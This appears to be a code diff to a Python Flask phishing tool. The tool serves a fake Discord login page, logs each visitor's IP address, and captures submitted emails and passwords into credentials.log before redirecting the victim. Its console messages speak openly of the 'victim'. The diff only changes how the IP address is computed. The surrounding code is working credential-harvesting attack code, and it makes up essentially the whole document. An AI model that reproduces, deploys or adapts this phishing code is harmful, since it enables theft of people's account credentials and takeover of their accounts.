@@ -32,9 +32,8 @@ print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waitin
 #### App.route
 @app.route("/")
 def index():
-    ip_addr = Fore.CYAN + request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else Fore.CYAN + request.remote_addr
     print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim has gone to the phishing page!" + " " * 40)
-    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found:", ip_addr)
+    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found:", request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr)
     print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
     print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...",end="\r")
     return render_template("Discord.html")
@@ -42,12 +41,11 @@ def index():
 @app.route("/login", methods=["POST"])
 def getcreds():
     with open("credentials.log" , "a") as file:
-        ip_addr = request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr
         print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered credentials!"+ " " * 43)
         print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Email: " + Fore.CYAN + request.form.get('email'), "\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + request.form.get('password') + " " * 100)
-        file.write(f"{request.form.get('email')} : {request.form.get('password')} : {ip_addr} : {sitename}\n")
-        print(Fore.RED + "[" + Fore.BLUE
-
+        file.write(f"{request.form.get('email')} : {request.form.get('password')} : {request.headers.get('X-Forwarded-For') if request.headers.get('X-Forwarded-For') is not None else request.remote_addr} : {sitename}\n")
+        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
+        return redirect(redirect_url)
 
 
 
